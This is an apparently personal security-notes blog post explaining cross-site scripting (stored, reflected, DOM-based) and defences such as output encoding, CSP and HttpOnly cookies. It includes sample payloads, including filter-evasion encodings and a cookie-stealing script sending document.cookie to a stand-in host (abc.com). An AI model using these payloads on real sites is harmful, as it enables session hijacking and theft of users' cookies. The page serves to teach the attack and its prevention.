<!DOCTYPE html><html lang="en" mode="dark" ><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no"><meta name="day-prompt" content="days ago"><meta name="hour-prompt" content="hours ago"><meta name="minute-prompt" content="minutes ago"><meta name="justnow-prompt" content="just now"><meta name="pv-proxy-endpoint" content="https://myochosite-291718.appspot.com/query?id=ahNwfm15b2Nob3NpdGUtMjkxNzE4chULEghBcGlRdWVyeRiAgIDo14eBCgw"><meta name="generator" content="Jekyll v4.3.2" /><meta property="og:title" content="Meow’s CyberAttack - Cross Site Scripting" /><meta property="og:locale" content="en" /><meta name="description" content="[toc]" /><meta property="og:description" content="[toc]" /><link rel="canonical" href="https://ocholuo.github.io//posts/XSS/" /><meta property="og:url" content="https://ocholuo.github.io//posts/XSS/" /><meta property="og:site_name" content="Grace" /><meta property="og:type" content="article" /><meta property="article:published_time" content="2020-09-19T11:11:11-04:00" /><meta name="twitter:card" content="summary" /><meta property="twitter:title" content="Meow’s CyberAttack - Cross Site Scripting" /><meta name="twitter:site" content="@twitter_username" /> <script type="application/ld+json"> {"@context":"https://schema.org","@type":"BlogPosting","dateModified":"2023-01-02T18:56:08-05:00","datePublished":"2020-09-19T11:11:11-04:00","description":"[toc]","headline":"Meow’s CyberAttack - Cross Site Scripting","mainEntityOfPage":{"@type":"WebPage","@id":"https://ocholuo.github.io//posts/XSS/"},"url":"https://ocholuo.github.io//posts/XSS/"}</script><title>Meow's CyberAttack - Cross Site Scripting | Grace</title><link rel="apple-touch-icon" sizes="180x180" href="/assets/img/favicons/apple-touch-icon.png"><link rel="icon" type="image/png" sizes="32x32" href="/assets/img/favicons/favicon-32x32.png"><link rel="icon" type="image/png" sizes="16x16" href="/assets/img/favicons/favicon-16x16.png"><link rel="manifest" href="/assets/img/favicons/site.webmanifest"><link rel="shortcut icon" href="/assets/img/favicons/favicon.ico"><meta name="apple-mobile-web-app-title" content="Grace"><meta name="application-name" content="Grace"><meta name="msapplication-TileColor" content="#da532c"><meta name="msapplication-config" content="/assets/img/favicons/browserconfig.xml"><meta name="theme-color" content="#ffffff"><link rel="preconnect" href="https://fonts.gstatic.com" crossorigin="anonymous"><link rel="dns-prefetch" href="https://fonts.gstatic.com"><link rel="preconnect" href="https://www.google-analytics.com" crossorigin="use-credentials"><link rel="dns-prefetch" href="https://www.google-analytics.com"><link rel="preconnect" href="https://www.googletagmanager.com" crossorigin="anonymous"><link rel="dns-prefetch" href="https://www.googletagmanager.com"><link rel="preconnect" href="https://myochosite-291718.appspot.com" crossorigin="use-credentials"><link rel="dns-prefetch" href="https://myochosite-291718.appspot.com"><link rel="preconnect" href="https://cdn.jsdelivr.net"><link rel="dns-prefetch" href="https://cdn.jsdelivr.net"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4.0.0/dist/css/bootstrap.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5.11.2/css/all.min.css"><link rel="stylesheet" href="/assets/css/style.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/afeld/bootstrap-toc@1.0.1/dist/bootstrap-toc.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/magnific-popup@1.1.0/dist/magnific-popup.min.css"> <script src="https://cdn.jsdelivr.net/npm/jquery@3/dist/jquery.min.js"></script><body data-spy="scroll" data-target="#toc"><div id="sidebar" class="d-flex flex-column align-items-end" lang="en"><div class="profile-wrapper text-center"><div id="avatar"> <a href="/" alt="avatar" class="mx-auto"> <img src="/assets/img/huoye.jpg" alt="avatar" onerror="this.style.display='none'"> </a></div><div class="site-title mt-3"> <a href="/">Grace</a></div><div class="site-subtitle font-italic">2023 Mar 14 updated</div></div><ul class="w-100"><li class="nav-item"> <a href="/" class="nav-link"> <i class="fa-fw fas fa-home ml-xl-3 mr-xl-3 unloaded"></i> <span>HOME</span> </a><li class="nav-item"> <a href="/categories/" class="nav-link"> <i class="fa-fw fas fa-stream ml-xl-3 mr-xl-3 unloaded"></i> <span>CATEGORIES</span> </a><li class="nav-item"> <a href="/tags/" class="nav-link"> <i class="fa-fw fas fa-tags ml-xl-3 mr-xl-3 unloaded"></i> <span>TAGS</span> </a><li class="nav-item"> <a href="/archives/" class="nav-link"> <i class="fa-fw fas fa-archive ml-xl-3 mr-xl-3 unloaded"></i> <span>ARCHIVES</span> </a><li class="nav-item"> <a href="/about/" class="nav-link"> <i class="fa-fw fas fa-info ml-xl-3 mr-xl-3 unloaded"></i> <span>ABOUT</span> </a></ul><div class="sidebar-bottom mt-auto d-flex flex-wrap justify-content-center"> <a href="https://github.com/ocholuo" aria-label="github" target="_blank" rel="noopener"> <i class="fab fa-github-alt"></i> </a> <a href="https://twitter.com/twitter_username" aria-label="twitter" target="_blank" rel="noopener"> <i class="fab fa-twitter"></i> </a> <a href=" javascript:location.href = 'mailto:' + ['',''].join('@')" aria-label="email" > <i class="fas fa-envelope"></i> </a> <a href="/feed.xml" aria-label="rss" > <i class="fas fa-rss"></i> </a></div></div><div id="topbar-wrapper" class="row justify-content-center topbar-down"><div id="topbar" class="col-11 d-flex h-100 align-items-center justify-content-between"> <span id="breadcrumb"> <span> <a href="/"> Home </a> </span> <span>Meow's CyberAttack - Cross Site Scripting</span> </span> <i id="sidebar-trigger" class="fas fa-bars fa-fw"></i><div id="topbar-title"> Post</div><i id="search-trigger" class="fas fa-search fa-fw"></i> <span id="search-wrapper" class="align-items-center"> <i class="fas fa-search fa-fw"></i> <input class="form-control" id="search-input" type="search" aria-label="search" autocomplete="off" placeholder="Search..."> <i class="fa fa-times-circle fa-fw" id="search-cleaner"></i> </span> <span id="search-cancel" >Cancel</span></div></div><div id="main-wrapper"><div id="main"><div class="row"><div id="post-wrapper" class="col-12 col-lg-11 col-xl-8"><div class="post pl-1 pr-1 pl-sm-2 pr-sm-2 pl-md-4 pr-md-4"><h1 data-toc-skip>Meow's CyberAttack - Cross Site Scripting</h1><div class="post-meta text-muted d-flex flex-column"><div> <span class="semi-bold"> Grace JyL </span> on <span class="timeago " data-toggle="tooltip" data-placement="bottom" title="Sat, Sep 19, 2020, 11:11 AM -0400" >Sep 19, 2020<i class="unloaded">2020-09-19T11:11:11-04:00</i> </span></div><div> <span> Updated <span class="timeago lastmod" data-toggle="tooltip" data-placement="bottom" title="Mon, Jan 2, 2023, 3:56 PM -0800" >Jan 2<i class="unloaded">2023-01-02T18:56:08-05:00</i> </span> </span> <span class="readtime" data-toggle="tooltip" data-placement="bottom" title="4662 words">25 min read</span> <span id="pv" class="pageviews"> <i class="fas fa-spinner fa-spin fa-fw"></i> </span> views</div></div><div class="post-content"><p>[toc]</p><hr /><h1 id="meows-cyberattack---cross-site-scripting-跨站脚本">Meow’s CyberAttack - Cross Site Scripting 跨站脚本</h1><p><img data-proofer-ignore data-src="https://i.imgur.com/9VHZkSZ.png" alt="Pasted Graphic" /></p><h2 id="part-one-overview">Part One: Overview</h2><ul><li>web application vulnerability<ul><li>是代码注入的一种。<li>将代码注入到网页上，其他用户在观看网页时就会受到影响。</ul><li>the basics of this attack revolve around website design, dynamic content, and invalidated input data.</ul><h3 id="cross-site-scripting-xss-attacks-occur-when">Cross-Site Scripting (XSS) attacks occur when:</h3><ul><li><code class="language-plaintext highlighter-rouge">Data enters a Web application through an untrusted source</code> (web request.etc)<ul><li>attacker take advantage of scripting and have it perform something other than the intended response.<ul><li>sends a speciﬁc request to a website, embed malicious code into web site’s code.<li>The malicious content often is a segment of <code class="language-plaintext highlighter-rouge">JavaScript, HTML, Flash, or other type of code that the browser may execute</code><li>use a client-side scripting language</ul><li>trick a user who visits the site into having code execute locally.</ul><li><p><code class="language-plaintext highlighter-rouge">malicious scripts are injected into trusted websites</code>.</p><li><p>During page generation, the application <code class="language-plaintext highlighter-rouge">does not prevent the data from containing content that is executable by a web browser</code></p><li><code class="language-plaintext highlighter-rouge">data included dynamic content that is sent to a web user without being validated</code> for malicious content.<ul><li>Flaws that allow these attacks to succeed are quite widespread<li>occur anywhere a web application uses input from a user within generates the output of it without validating or encoding it.<li>causes the website to send malicious Web / email code to user.</ul><li><p>A victim visits the generated web page through a web browser, which contains malicious script that was injected using the untrusted data.</p><li><code class="language-plaintext highlighter-rouge">The code executes when the user visits the site</code>.<ul><li>when a web form pops up, the user inputs something, and then some script dynamically changes the appearance or behavior of the website based on what has been entered.<li>这类攻击通常包含了HTML以及用户端脚本语言<li>通过客户端脚本语言（如 JavaScript), 在论坛发帖中发布一段恶意的JavaScript代码脚本注入，如果这个代码内容有请求外部服务器，那么就叫做XSS</ul></ul><blockquote><p>By exploiting vulnerabilities of web server, attacker uses the website as an intermediary for transferring malicious code to another victim. attacker uses a web application to send malicious code, generally in the form of a browser side script, to a different end user. victim is usually not aware of being exploited because as assumes the data received are from a valid Web server.</p></blockquote><ul><li>finds website section where users can interact with each other.<ul><li>like product review section.<li>in the input text field, the attacker types in some script (like JavaScript), next time a user visits that section of the website, the script is executed.<li>when the security of a web app relies on JavaScript for input validation, The integrity of the data is at risk.</ul><li>Example:<ul><li>UserA gets a message about his XYZ account, but the link in the message is not really to the XYZ site (phishing ploy).<li>When he visits the site, a script routine begins to run on his machine with his permissions, can do things as running malevolent 有恶意的 routines to send, delete, or alter data.<li>A web application is configured to target browsers</ul></ul><hr /><h3 id="xss-attack-consequences">XSS Attack Consequences</h3><p>The consequence of an XSS attack is the same regardless of whether it is stored or reflected (or DOM Based). The difference is in how the payload arrives at the server.</p><ol><li><code class="language-plaintext highlighter-rouge">has access to user's sensitive information</code><ul><li>the malicious script can access any cookies, session tokens, or other sensitive information retained by the browser and used with that site.<li>disclosure of the user’s session cookie<li>copy cookies from the victim’s computer and relay them to the attacker.<li>allowing an attacker to hijack the user’s session and take over the account.<li>disclosure of end user files,</ul><li><p><code class="language-plaintext highlighter-rouge">installation of Trojan horse programs</code></p><li><code class="language-plaintext highlighter-rouge">redirect the user to some other page or site, controlled by the attacker</code>,<ul><li>send HTTP requests with arbitrary content to arbitrary destinations<li>by using <code class="language-plaintext highlighter-rouge">XMLHttpRequest</code> and other mechanisms.</ul><li><code class="language-plaintext highlighter-rouge">modify presentation of content</code><ul><li>make arbitrary modifications to the HTML of the current page<li>by using DOM manipulation methods.<ul><li>An XSS vulnerability allowing an attacker to modify a press release or news item could affect a company’s stock price or lessen consumer confidence.<li>An XSS vulnerability on a pharmaceutical site could allow an attacker to modify dosage information resulting in an overdose.</ul></ul><li><p><code class="language-plaintext highlighter-rouge">performing malicious operations on the user’s machine</code> under the guise of the vulnerable site.</p><li><code class="language-plaintext highlighter-rouge">Keylogging</code><ul><li>The attacker can register a keyboard event listener using <code class="language-plaintext highlighter-rouge">addEventListener</code><li>send all of the user’s keystrokes to his own server,<li>potentially recording sensitive information<li>such as passwords and credit card numbers.</ul><li><code class="language-plaintext highlighter-rouge">Phishing</code><ul><li>insert a fake login form into the page using DOM manipulation,<li>set the form’s action attribute to target his own server,<li>and then trick the user into submitting sensitive information.</ul></ol><p>XSS can be used to perform badness on a target server.</p><ul><li>bring a target down with a good old DoS attack?<li>send an XSS attack via e-mail?<li>having the injected script remain permanently on the target server (like in a database, message forum, visitor log, or comment field)?<li>be used to upload malicious code to users connected to the server, to send pop-up messages to users, and to steal virtually anything.<li>That PHP session ID that identifies the user to the website stolen through an XSS, the attacker now and can masquerade as the user all day, plugged into a session.</ul><p>XSS attacks can vary by application and by browser and can range from nuisance to severe impact, depending on what the attacker chooses to do.</p><ul><li>RSnake and http://hackers.org/xss.html are authoritative sources for XSS attacks.</ul><hr /><h2 id="part-two-xss-attacks">Part Two: XSS Attacks</h2><p>Different XSS Attacks</p><ul><li><code class="language-plaintext highlighter-rouge">Stored</code> vs. <code class="language-plaintext highlighter-rouge">Reflected</code> XSS<li><code class="language-plaintext highlighter-rouge">Server</code> vs. <code class="language-plaintext highlighter-rouge">Client</code> XSS<ul><li><code class="language-plaintext highlighter-rouge">DOM Based XSS</code> is a subset of Client XSS.</ul></ul><hr /><h3 id="stored-xss-attacks">Stored XSS Attacks</h3><ul><li><code class="language-plaintext highlighter-rouge">Persistent / Type-I XSS</code><li>the injected script is <strong>permanently stored on the target servers</strong><ul><li>such as in a database, message forum, visitor log, comment field, etc.</ul><li>The victim retrieves the malicious script from the server when it requests the stored information.</ul><div class="language-html highlighter-rouge"><div class="code-header" text-data="html"><button data-original-title="Copied!"><i class="far fa-clone"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
</pre><td class="rouge-code"><pre><span class="nt">&lt;Script&gt;</span>alert(‘XSS!’)<span class="nt">&lt;/script&gt;</span>
<span class="nt">&lt;H1&gt;</span>Big Title<span class="nt">&lt;/H1&gt;</span>
</pre></table></code></div></div><ul><li>Goal:<ul><li>the user targets a <code class="language-plaintext highlighter-rouge">specific individual</code>, send the malicious URL to the victim (using e-mail or instant messaging, for example) and trick him into visiting it.<li>the user targets a <code class="language-plaintext highlighter-rouge">large group of people</code>, the attacker can publish a link to the malicious URL (on his own website or on a social network, for example) and wait for visitors to click it.</ul></ul><p><img data-proofer-ignore data-src="https://i.imgur.com/YdW8p1t.png" alt="persistent-xss" /></p><hr /><h3 id="reflected-xss-attacks">Reflected XSS Attacks</h3><ul><li><code class="language-plaintext highlighter-rouge">Non-Persistent / Type-II XSS</code><li>The user input is <code class="language-plaintext highlighter-rouge">been reflected as part of the page</code>.<li>the injected script is reflected off the web server<ul><li>such as in an error message, search result<li>any response that includes some input sent to the server as part of the request.</ul><li>Reflected attacks are delivered to victims via another route<ul><li>such as in e-mail message, or on some other website.<li>When user click on a malicious link, submitting a specially crafted form, or even just browsing to a malicious site<li>the injected code travels to the vulnerable web site, which reflects the attack back to the user’s browser.<li>The browser then executes the code because it came from a “trusted” server.</ul></ul><div class="language-html highlighter-rouge"><div class="code-header" text-data="html"><button data-original-title="Copied!"><i class="far fa-clone"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre><span class="nt">&lt;Script&gt;</span>alert(document.cookie)<span class="nt">&lt;/script&gt;</span>
</pre></table></code></div></div><p><img data-proofer-ignore data-src="https://i.imgur.com/fePlrGA.png" alt="Screen Shot 2020-09-19 at 15.27.24" /></p><p><img data-proofer-ignore data-src="https://i.imgur.com/mqBNTfb.png" alt="reflected-xss" /></p><hr /><h3 id="dom-based-xss">DOM Based XSS</h3><ul><li><code class="language-plaintext highlighter-rouge">Document object model</code>.<li>Type-0 XSS, identified by Amit Klein in 2005.<li>the attack payload is executed as a result of modifying the DOM “environment” in the victim’s browser used by the original client side script<ul><li><code class="language-plaintext highlighter-rouge">The malicious code does not come from the web server or database</code>.<li>It is <code class="language-plaintext highlighter-rouge">injected and stays in the browser the entire time</code><li>the client side code runs in an “unexpected” manner.<li>the page itself (the HTTP response) does not change<li>but the client side code contained in the page executes differently due to the malicious modifications that have occurred in the DOM environment.</ul><li>This is in contrast to other XSS attacks (stored or reflected)<ul><li>wherein the attack payload is placed in the response page (due to a server side flaw).<li>In <strong>persistent and reflected XSS attacks</strong><ul><li>the server inserts the malicious script into the page,<li>then sent in a response to the victim.<li>When the victim’s browser receives the response, it assumes the malicious script to be part of the page’s legitimate content and automatically executes it during page load as with any other script.</ul><li>In <strong>DOM-based XSS attack</strong><ul><li>no malicious script inserted as part of the page;<li>the only script that is automatically executed during page load is a legitimate part of the page.<li>but this <code class="language-plaintext highlighter-rouge">legitimate script directly makes use of user input</code> in order to <code class="language-plaintext highlighter-rouge">add HTML to the page</code>.<li>Because the <code class="language-plaintext highlighter-rouge">malicious string is inserted into the page using</code> <code class="language-plaintext highlighter-rouge">innerHTML</code>, it is parsed as HTML, causing the malicious script to be executed.</ul></ul><li>The difference is subtle but important:<ul><li>In traditional XSS,<ul><li>the malicious JavaScript is <code class="language-plaintext highlighter-rouge">executed when the page is loaded</code>,<li>as part of the HTML sent by the server.</ul><li>In DOM-based XSS,<ul><li>the malicious JavaScript is <code class="language-plaintext highlighter-rouge">executed at some point after the page has loaded</code>,<li>as a result of the <code class="language-plaintext highlighter-rouge">page's legitimate JavaScript treating user input in an unsafe way</code>.</ul></ul></ul><p><img data-proofer-ignore data-src="https://i.imgur.com/QUYYLBb.png" alt="dom-based-xss" /></p><p>Example</p><ul><li>code for create a form to let the user choose their preferred language.<li>A default language is also provided in the query string, as the parameter “default”.</ul><div class="language-js highlighter-rouge"><div class="code-header" text-data="js"><button data-original-title="Copied!"><i class="far fa-clone"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
</pre><td class="rouge-code"><pre><span class="c1">// Select your language:</span>
<span class="o">&lt;</span><span class="nx">select</span><span class="o">&gt;&lt;</span><span class="nx">script</span><span class="o">&gt;</span>
	<span class="nb">document</span><span class="p">.</span><span class="nf">write</span><span class="p">(</span> <span class="dl">"</span><span class="s2">&lt;OPTION value=1&gt;</span><span class="dl">"</span> <span class="o">+</span> <span class="nb">document</span><span class="p">.</span><span class="nx">location</span><span class="p">.</span><span class="nx">href</span><span class="p">.</span><span class="nf">substring</span><span class="p">(</span><span class="nb">document</span><span class="p">.</span><span class="nx">location</span><span class="p">.</span><span class="nx">href</span><span class="p">.</span><span class="nf">indexOf</span><span class="p">(</span><span class="dl">"</span><span class="s2">default=</span><span class="dl">"</span><span class="p">)</span><span class="o">+</span><span class="mi">8</span><span class="p">)</span> <span class="o">+</span> <span class="dl">"</span><span class="s2">&lt;/OPTION&gt;</span><span class="dl">"</span> <span class="p">);</span>
	<span class="nb">document</span><span class="p">.</span><span class="nf">write</span><span class="p">(</span> <span class="dl">"</span><span class="s2">&lt;OPTION value=2&gt;English&lt;/OPTION&gt;</span><span class="dl">"</span> <span class="p">);</span>
<span class="o">&lt;</span><span class="sr">/script&gt;&lt;/</span><span class="nx">select</span><span class="o">&gt;</span>

<span class="c1">// The page is invoked with a URL such as:</span>
<span class="nx">http</span><span class="p">:</span><span class="c1">//www.some.site/page.html?default=French</span>

<span class="c1">// A DOM Based XSS attack against this page can be accomplished by sending the following URL to a victim:</span>
<span class="nx">http</span><span class="p">:</span><span class="c1">//www.some.site/page.html?default=&lt;script&gt;alert(document.cookie)&lt;/script&gt;</span>

<span class="c1">// When the victim clicks on this link, the browser sends a request to www.some.site.</span>
<span class="o">/</span><span class="nx">page</span><span class="p">.</span><span class="nx">html</span><span class="p">?</span><span class="k">default</span><span class="o">=&lt;</span><span class="nx">script</span><span class="o">&gt;</span><span class="nf">alert</span><span class="p">(</span><span class="nb">document</span><span class="p">.</span><span class="nx">cookie</span><span class="p">)</span><span class="o">&lt;</span><span class="sr">/script</span><span class="err">&gt;
</span>
<span class="c1">// The server responds with the page containing the above Javascript code.</span>
<span class="c1">// The browser creates a DOM object for the page, in which the document.location object contains the string:</span>
<span class="nx">http</span><span class="p">:</span><span class="c1">//www.some.site/page.html?default=&lt;script&gt;alert(document.cookie)&lt;/script&gt;</span>


<span class="c1">// The original Javascript code in the page does not expect the default parameter to contain HTML markup, and as such it simply ecloes it into the page (DOM) at runtime.</span>
<span class="c1">// The browser then renders the resulting page and executes the attacker’s script:</span>
<span class="nf">alert</span><span class="p">(</span><span class="nb">document</span><span class="p">.</span><span class="nx">cookie</span><span class="p">)</span>
</pre></table></code></div></div><p>Note that the HTTP response sent from the server does not contain the attacker’s payload. This payload manifests itself at the client-side script at runtime, when a flawed script accesses the DOM variable document.location and assumes it is not malicious.</p><ol><li>The attacker crafts a URL containing a malicious string and sends it to the victim.<li>The victim is tricked by the attacker into requesting the URL from the website.<li>The website receives the request, without the malicious string in the response.<li>The victim’s browser executes the legitimate script inside the response, causing the malicious script to be inserted into the page.<li>The victim’s browser executes the malicious script inserted into the page, sending the victim’s cookies to the attacker’s server.</ol><p>Why DOM-based XSS matters</p><ul><li>In the previous example, JavaScript was not necessary;<li>the server could have generated all the HTML by itself.<li>If the server-side code were free of vulnerabilities, the website would then be safe from XSS.</ul><p>However, as web applications become more advanced, an <code class="language-plaintext highlighter-rouge">increasing amount of HTML is generated by JavaScript on the client-side rather than by the server</code>.</p><ul><li>Any time content needs to be changed without refreshing the entire page, the update must be performed using JavaScript.<li>Most notably, this is the case when a page is updated after an AJAX request.<li>This means that XSS vulnerabilities can be present not only in your website’s server-side code, <code class="language-plaintext highlighter-rouge">but also in your website's client-side JavaScript code</code>.<li>Consequently, even with completely secure server-side code, the client-side code might still unsafely include user input in a DOM update after the page has loaded.<li>If this happens, the client-side code has enabled an XSS attack through no fault of the server-side code.</ul><p>DOM-based XSS invisible to the server</p><ul><li>special case of DOM-based XSS<li><code class="language-plaintext highlighter-rouge">the malicious string is never sent to the website's server to begin with</code>:<li>when the malicious string is contained in a URL’s fragment identifier (anything after the # character).<li>Browsers do not send this part of the URL to servers, so the website has no way of accessing it using server-side code.<li>The client-side code, however, has access to it and can thus cause XSS vulnerabilities by handling it unsafely.<li>This situation is not limited to fragment identifiers. Other user input that is invisible to the server includes new HTML5 features like LocalStorage and IndexedDB.</ul><hr /><h2 id="what-xss-is">what XSS is</h2><h3 id="alternate-xss-syntax">Alternate XSS Syntax</h3><p>XSS Using Script in Attributes</p><ul><li>conducted with <code class="language-plaintext highlighter-rouge">&lt;script&gt;...&lt;/script&gt;</code> tags.<li>Other tags: <code class="language-plaintext highlighter-rouge">&lt;body onload=alert('test1')&gt;</code> <li>Onmouseover: <code class="language-plaintext highlighter-rouge">&lt;b onmouseover=alert('Wufff!')&gt;click me!&lt;/b&gt;</code><li>Onerror: <code class="language-plaintext highlighter-rouge">&lt;img src="http://url.to.file.which/not.exist" onerror=alert(document.cookie);&gt;</code></ul><p>XSS Using Script Via Encoded URI Schemes</p><ul><li>to hide against web application filters, encode string characters,<li>e.g.: <code class="language-plaintext highlighter-rouge">a=&amp;\#X41 (UTF-8)</code><li>use it in IMG tags: <code class="language-plaintext highlighter-rouge">&lt;IMG SRC=j&amp;#X41vascript:alert('test2')&gt;</code></ul><p>XSS Using Code Encoding</p><ul><li>encode script in <code class="language-plaintext highlighter-rouge">base64</code> and place it in META tag.<li>This way get rid of <code class="language-plaintext highlighter-rouge">alert()</code> totally.<li><code class="language-plaintext highlighter-rouge">&lt;META HTTP-EQUIV="refresh"CONTENT="0;url=data:text/html; base64,PHNjcmlwdD5hbGVydCgndGVzdDMnKTwvc2NyaXB0Pg"&gt;</code></ul><p>One of the classic attacks:</p><p>getting access to “<code class="language-plaintext highlighter-rouge">document.cookie</code>” and sending it to a remote host.</p><ul><li>used the following in a form field entry instead of providing your name:<li><code class="language-plaintext highlighter-rouge">&amp;lt;script;window.open#40;&amp;quot;http://abc.com/getcookie.acookie=&amp;quot;+document.cookie#41;&amp;lt;/script&amp;gt;</code><li>Should the app be vulnerable to XSS, the Java script entered (converted to HTML entities where appropriate—how fun!) will be run and you can obtain cookies from users accessing the page later</ul><hr /><h3 id="what-you-can-do-with-it">what you can do with it</h3><p>Recognize URL indicator of an XSS attempt:</p><ul><li><code class="language-plaintext highlighter-rouge">http://IPADDRESS/′′;!- -′′&lt;XSS&gt;=&amp;{()}</code><li>XSS attempts pop up all over the place in in all sorts of formats.</ul><h3 id="how-to-determine-vulnerable">How to Determine Vulnerable</h3><ul><li>perform a <code class="language-plaintext highlighter-rouge">security review of the code</code><li>search for <code class="language-plaintext highlighter-rouge">all places where input from an HTTP request</code> could possibly make its way into the HTML output.<li><code class="language-plaintext highlighter-rouge">variety of different HTML tags can be used to transmit a malicious JavaScript</code>.<li>Nessus, Nikto, and some other available tools can help scan a website for these flaws, but can only scratch the surface.<li>If one part of a website is vulnerable, there is a high likelihood that there are other problems as well.</ul><hr /><h2 id="part-three-preventing-xss">Part Three: Preventing XSS</h2><h3 id="countermeasures">Countermeasures</h3><ol><li><p>Don’t trust input</p><li><strong>Input validation</strong> <code class="language-plaintext highlighter-rouge">The primary protection</code><ul><li>the web application with sophisticated <code class="language-plaintext highlighter-rouge">input validation techniques</code>.<li><code class="language-plaintext highlighter-rouge">constrain 约束 and sanitize</code> the input data stream,<li><code class="language-plaintext highlighter-rouge">Validation, filters the user input</code> so that the browser interprets it as code without malicious commands.<li>All input data should be <code class="language-plaintext highlighter-rouge">checked for data type, format, range, and irregular expressions</code>.<li><code class="language-plaintext highlighter-rouge">Whiltelist</code> of allowed values<li><code class="language-plaintext highlighter-rouge">avoid methods that allow the web page to display untrusted data</code>.<li>Input originating from server controls should be subject to <code class="language-plaintext highlighter-rouge">ASP.NET validator controls</code> such as <code class="language-plaintext highlighter-rouge">RangeValidator</code>.</ul><li>use a <strong>security encoding library</strong> <code class="language-plaintext highlighter-rouge">OWASP strongly recommends</code><ul><li>escapes user input so the browser <code class="language-plaintext highlighter-rouge">interprets it as data, not as code</code><li>encoding library will <code class="language-plaintext highlighter-rouge">sanitize HTML code</code><li><code class="language-plaintext highlighter-rouge">encode output</code> that contains user input data or data from databases.<li><code class="language-plaintext highlighter-rouge">HtmlEncode</code>: encode characters with special designations in HTML<ul><li>obscuring executable code that would otherwise be run.<li><code class="language-plaintext highlighter-rouge">Label1.Text = “This is output:” + Server.HtmlEncode(TextBox1.Text);</code></ul><li>Replace “&lt;” and “&gt;” characters with “&amp; lt;” and “&amp; gt;” using server scripts</ul><li>Use buildin protection on frame or library<ul><li>VS: <code class="language-plaintext highlighter-rouge">ValidationRequest=“false”</code></ul><li>Use <strong>security headers</strong><ul><li><code class="language-plaintext highlighter-rouge">CSP, contact security policy</code><li><code class="language-plaintext highlighter-rouge">X-XSS-protection</code></ul><li>Set <strong>flags on cookies</strong><ul><li><code class="language-plaintext highlighter-rouge">HttpOnly, Secure</code></ul><li>educate users about the dangers of clicking links.<ul><li>Some XSS attacks send emails with malicious links within them.</ul><li><code class="language-plaintext highlighter-rouge">turn off HTTP TRACE support on all web servers</code>.<ul><li>An attacker can steal cookie data via Javascript even when <code class="language-plaintext highlighter-rouge">document.cookie</code> is disabled or not supported by the client.<li>This attack is mounted when a user posts a malicious script to a forum so when another user clicks the link, an asynchronous HTTP Trace call is triggered which collects the user’s cookie information from the server, and then sends it over to another malicious server that collects the cookie information so the attacker can mount a session hijack attack.<li>mitigated by removing support for HTTP TRACE on all web servers.</ul></ol><hr /><ul><li><strong>Context</strong><ul><li><code class="language-plaintext highlighter-rouge">Secure input handling</code> needs to be performed differently depending on where in a page the user input is inserted.</ul><li><strong>Inbound/outbound</strong><ul><li><code class="language-plaintext highlighter-rouge">Secure input handling</code> can be performed either when your website receives the input (inbound) or right before your website inserts the input into a page (outbound).</ul><li><strong>Client/server</strong><ul><li><code class="language-plaintext highlighter-rouge">Secure input handling</code> can be performed either on the client-side or on the server-side, both of which are needed under different circumstances.</ul></ul><hr /><h3 id="input-handling-contexts">Input handling contexts</h3><p>contexts in a web page where user input might be inserted.</p><ul><li>specific rules must be followed<li>so that the user input cannot break out of its context and be interpreted as malicious code.</ul><div class="table-wrapper"><table><thead><tr><th>Context<th>Example code<tbody><tr><td>HTML element content<td><code class="language-plaintext highlighter-rouge">&lt;div&gt;userInput&lt;/div&gt;</code><tr><td>HTML attribute value<td><code class="language-plaintext highlighter-rouge">&lt;input value="userInput"&gt;</code><tr><td>URL query value<td><code class="language-plaintext highlighter-rouge">http://example.com/?parameter=userInput</code><tr><td>CSS value<td><code class="language-plaintext highlighter-rouge">color: userInput</code><tr><td>JavaScript value<td><code class="language-plaintext highlighter-rouge">var name = "userInput";</code></table></div><ul><li>XSS vulnerability arise if user input were inserted, before being encoded or validated.<li>An attacker would then be able to inject malicious code by simply inserting the closing delimiter for that context and following it with the malicious code.</ul><p>For example,</p><ul><li>if a website inserts user input directly into an HTML attribute,<li>an attacker would be able to inject a malicious script by beginning his input with a quotation mark:</ul><div class="table-wrapper"><table><thead><tr><th>Context<th>Example<tbody><tr><td>Application code<td><code class="language-plaintext highlighter-rouge">&lt;input value="userInput"&gt;</code><tr><td>Malicious string<td><code class="language-plaintext highlighter-rouge">"&gt;&lt;script&gt;...&lt;/script&gt;&lt;input value="</code><tr><td>Resulting code<td><code class="language-plaintext highlighter-rouge">&lt;input value=""&gt;&lt;script&gt;...&lt;/script&gt;&lt;input value=""&gt;</code></table></div><h3 id="inboundoutbound-input-handling">Inbound/outbound input handling</h3><ul><li>Relying on inbound input handling to prevent XSS is thus a very brittle solution that will be prone to errors. (The deprecated “magic quotes” feature of PHP is an example of such a solution.)<li>Instead, <code class="language-plaintext highlighter-rouge">outbound input handling should be your primary line of defense against XSS</code>, because it can take into account the specific context that user input will be inserted into.</ul><p>Where to perform secure input handling</p><ul><li>In most modern web applications, to protect against all types of XSS,<li>secure user input handling must be performed in <code class="language-plaintext highlighter-rouge">both the server-side code and the client-side code</code>.<ul><li>to protect against <strong>traditional XSS</strong>,<ul><li>secure input handling must be performed in <code class="language-plaintext highlighter-rouge">server-side code</code>.<li>This is done using any language supported by the server.</ul><li>to protect against <strong>DOM-based XSS</strong><ul><li>where the server never receives the malicious string (such as the fragment identifier attack described earlier),<li>secure input handling must be performed in <code class="language-plaintext highlighter-rouge">client-side code</code>.<li>This is done using JavaScript.</ul></ul></ul><hr /><h3 id="encoding">Encoding</h3><ul><li>use a security encoding library.<li>OWASP strongly recommends<li>escapes user input so the browser interprets it as data, not as code.<li>encoding library will sanitize HTML code and prevent XSS attacks.<li>encode output that contains user input data or data from databases.<li>HtmlEncode: encode characters with special designations in HTML<li>obscuring executable code that would otherwise be run.<li>` Label1.Text = “This is output:” + Server.HtmlEncode(TextBox1.Text);`<li>Replace “&lt;” and 